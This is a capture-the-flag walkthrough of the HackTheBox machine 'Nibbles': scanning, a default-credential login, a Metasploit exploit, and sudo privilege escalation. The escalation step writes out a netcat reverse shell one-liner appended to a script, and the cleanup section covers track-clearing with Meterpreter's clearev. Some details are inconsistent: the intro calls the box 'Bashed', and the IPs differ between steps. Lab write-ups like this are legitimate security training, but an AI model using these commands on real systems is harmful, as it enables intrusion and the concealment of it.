[Back to Main Page](../index.html) 

# Nibbles on HackTheBox


![htb](https://www.yeahhub.com/wp-content/uploads/2018/03/hackthebox.png)



## Introduction

Bashed is a beginner's box which was the first CTF I ever attempted. When I tried it, I had booted up Kali and knew that a couple tools existed, but did not have any strategies, context or experience. 

This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work. The tools come with a stock Kali installation, unless otherwise mentioned.

## 1. Initial Scanning

As usual on HTB we only have the IP in the network so we start an nmap scan.

`nmap 10.10.10.68`

![1nmap](https://i.imgur.com/2rih64N.png)

nmap did find SSH and Port 80.

Due this we check out the webpage and look closer at the source code.

![1source](https://i.imgur.com/lYBc5oS.png)

Interesting. /nibbleblog/
Therefore we use DIRB against /nibbleblog/. DIRB is a Web Content Scanner.

`dirb http://10.10.10.75/nibbleblog/`

![1source](https://i.imgur.com/p566uDd.png)

It shows admin.php, which is an login interface.

## 2. Using the basics to get access

Before trying to break into it, always try some defaults. 

Easy-Peasy.

`admin:nibbles`

![1break](https://i.imgur.com/17wiJUm.png)

We're in! 

After a while of searching the webinterface and not getting any further I decided to check for exploits. 

I looked up for any exploit with nibble in it and GOTCHA.  
 
`searchsploit nibble`

![1search](https://i.imgur.com/rFxtQsi.png)

Of course, I used the metasploit exploit, so I called in the msf console.

## 3. Exploit

The Metasploit Project is well known for its anti-forensic and evasion tools, some of which are built into the Metasploit Framework.
Metasploit currently has over 1677 exploits, organized under the following platforms: AIX, android, bsd, bsdi, cisco, firefox, freebsd, hpux, irix, java, javascript, linux, mainframe, multi (applicable to multiple platforms), netbsd, netware, nodejs, openbsd, osx, php, python, R, ruby, solaris, unix, and windows.

![1splot](https://i.imgur.com/CISJNvpg.png)

Setup the exploit. Additional we set the Listerner LHOST to our IP and LPORT to 4000.
After that we fired it up.

![2splot](https://i.imgur.com/ZE648q2.png)

## 4. Capturing the Flag

Somebody left the flag after exploiting the monitor.sh in the /tmp/ folder, but I wanted to get it for real myself.

I found a zip within home/nibbler with a monitor.sh in it.
To de-zip, or execute files you always have to call the `shell` first.

![1ctf](https://i.imgur.com/HfUWxlj.png)

After that I did set up a nc listener on post 2491 and added following command into the monitor.sh file.

`echo "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.XXX 2491 >/tmp/f" >> monitor.sh`

Thank you for that command @sicurolab, since I was stuck here.

![2ctf](https://i.imgur.com/ANHg0Jv.png)

We then execute the monitor.sh file with /usr/bin/sudo and receive our root shell.

![3ctf](https://i.imgur.com/J05iDMS.png)

`cat root.txt` - system flag captured!

`cat /home/nibbles/user.txt` - user flag captured!

## 5. Cleanup
 
Firstup I cleaned the whole /tmp/ folder to make it harder for future players. 

Since this is a CTF, cleanup isn’t mandatory.
However, we want to develop good habits and operational security practice. Meterpreter has a `clearev` command that can be used to cover our tracks - let’s run it and be out of here.

![hacked](https://cdn-images-1.medium.com/max/1600/1*TtuBByJ52bSP-d2WPOczJg.png)
